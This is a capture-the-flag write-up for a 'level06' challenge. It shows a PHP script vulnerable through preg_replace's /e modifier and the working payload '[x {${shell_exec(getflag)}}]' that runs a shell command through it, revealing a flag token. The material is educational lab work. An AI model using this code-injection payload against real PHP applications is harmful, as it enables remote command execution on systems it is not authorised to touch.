# First step

We have level06 and level06.php in the same folder.

```shell
$> ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

```php
#!/usr/bin/php
<?php
    function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
    }
    function x($y, $z) {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
        return $a;
    }
    $r = x($argv[1], $argv[2]);
    print $r;
?>
```

Some research about PHP and how to use it, you can find it on the internet.  

- file_get_contents(): get file content  
- preg_replace(): replace a pattern with a replacement  
- '/e' modifier in preg_replace(): execute the content in the replacement string as PHP code  
- \[x: first part of the pattern: begining by [x  
- (.*): second part of the pattern: the content after [x  
- '"y(\"\\2\")"': replace the second part of the pattern with the content of the function y  

# Seconde step

We know with '/e' we can execute the content in the replacement string as PHP code.  
```shell
# we can execute a shell command with shell_exec() in php  

# [x: first part of the pattern: begining by [x  
# {${shell_exec(getflag)}}  
# -> {}: to let preg_replace (/e mode) know, is a php code  
# -> ${}: to let php know, is a variable/function/method
$> echo '[x {${shell_exec(getflag)}}]' > /tmp/getflag

$> ./level06 /tmp/getflag
[...]
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
[...]
```
